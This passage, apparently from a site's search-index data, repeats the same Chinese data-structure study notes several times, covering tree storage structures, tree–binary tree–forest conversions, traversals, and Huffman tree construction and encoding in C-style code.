struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#森林转化为二叉树"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#二叉树转换成森林"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#树的遍历"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#先根次序遍历"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ 